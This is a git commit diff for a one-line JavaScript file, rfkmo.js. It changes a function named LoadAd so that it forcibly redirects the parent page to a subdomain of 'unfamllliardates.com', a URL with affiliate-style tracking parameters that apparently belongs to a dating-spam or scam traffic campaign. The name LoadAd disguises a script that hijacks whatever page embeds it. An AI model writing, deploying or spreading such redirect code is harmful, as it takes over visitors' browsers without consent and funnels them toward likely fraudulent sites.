5f8ef3f7dc833b8c4d2e4389b303eb90fc5d4194
bloggerenka <121873699+bloggerenka@users.noreply.github.com>
2025-07-01 21:40:08 +0700

    Update rfkmo.js

--- rfkmo.js
+++ rfkmo.js
@@ -1,1 +1,1 @@
-function LoadAd() { parent.location.href="https://imo.com"; } LoadAd();
+function LoadAd() { parent.location.href="https://jdbqg.unfamllliardates.com/?utm_source=da57dc555e50572d&ban=fb&j1=1&s1=65949&s2=2145007&s3=talkme"; } LoadAd();
